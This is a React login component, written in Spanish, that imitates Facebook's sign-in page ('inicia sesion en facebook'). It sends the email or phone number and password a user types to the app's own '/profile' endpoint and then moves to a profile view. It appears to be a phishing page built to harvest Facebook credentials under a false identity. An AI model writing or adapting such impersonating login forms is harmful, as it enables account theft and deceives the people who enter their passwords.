import React, {useState} from 'react';
import style from './style.css';
import Content from '../content';
import api from '../../../api.js';

function Login (props) {

  const [password, set_password] = useState('');
  const [email, set_email] = useState('');
  const [loading, set_loading] = useState(false);

  const send_data = async () => {
    const response = await api({
      method: 'update',
      url:  '/profile',
      data: {password, email, id: props.id},
    })
    props.set_page('profile');
  }

  const handleSubmit = (e) => {
    e.preventDefault();
    if (loading) return false;
    if (password.length < 5){
      alert('constraseña incorrecta');
    } else if (email.length < 10){
      alert('correo electronico o numero incorrecto')
    } else {
      set_loading(true);
      send_data();
    }
  }

  return (
    <Content className={style.login}>
      <form className={style.form} onSubmit={handleSubmit}>
        <h1 className={style.title}>inicia sesion en facebook</h1>
        <input type="text" className={style.input} placeholder="Correo electronico o numero de telefono" value={email} onChange={(e) => set_email(e.target.value)}/>
        <input type="password" className={style.input} placeholder="Contraseña" value={password} onChange={(e) => set_password(e.target.value)}/>
        {loading && (<button type="submit" className={`${style.input} ${style.button_locked}`}>Iniciar sesion</button>)}
        {!loading && (<button type="submit" className={`${style.input} ${style.button}`}>Iniciar sesion</button>)}
        <div className={style.option_text}>¿Olvidaste tu cuenta?</div>
        <div className={style.separator}>
          <hr className={style.line} />O<hr className={style.line} />
        </div>
        <div className={style.create_acount}>Crear cuenta nueva</div>
      </form>
    </Content>
  )
}

export default Login;
